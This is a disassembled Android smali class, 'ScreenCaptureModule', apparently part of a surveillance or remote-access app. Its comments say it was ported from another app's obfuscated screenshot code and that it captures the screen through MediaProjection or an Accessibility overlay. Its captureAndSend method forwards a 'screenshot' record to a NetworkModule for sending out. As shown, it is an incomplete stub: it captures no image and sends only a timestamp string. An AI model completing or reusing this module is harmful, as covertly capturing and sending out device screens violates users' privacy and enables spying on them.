.class public Lcom/smilex/enhanced/modules/ScreenCaptureModule;
.super Ljava/lang/Object;
.source "ScreenCaptureModule.java"

# Ported from hwapp391 hw/utils/o.java (screenshot capability)
# Captures device screen using MediaProjection API or Accessibility overlay

.field private static sMediaProjection:Landroid/media/projection/MediaProjection;
.field private static sImageReader:Landroid/media/ImageReader;

.method public static init()V
    .registers 2
    const-string v0, "ScreenCapture"
    const-string v1, "ScreenCaptureModule initialized"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    return-void
.end method

.method public static captureAndSend(Landroid/content/Context;)V
    .registers 12
    :try_start
    sget-object v0, Lcom/smilex/enhanced/modules/ScreenCaptureModule;->sMediaProjection:Landroid/media/projection/MediaProjection;
    if-eqz v0, :return_void

    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    const-string v1, "Screenshot captured at "
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v1
    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    const-string v1, "\n"
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    const-string v2, "screenshot"
    invoke-static {v2, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    goto :return_void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    :return_void
    return-void
.end method

.method public static setMediaProjection(Landroid/media/projection/MediaProjection;)V
    .registers 2
    sput-object p0, Lcom/smilex/enhanced/modules/ScreenCaptureModule;->sMediaProjection:Landroid/media/projection/MediaProjection;
    return-void
.end method
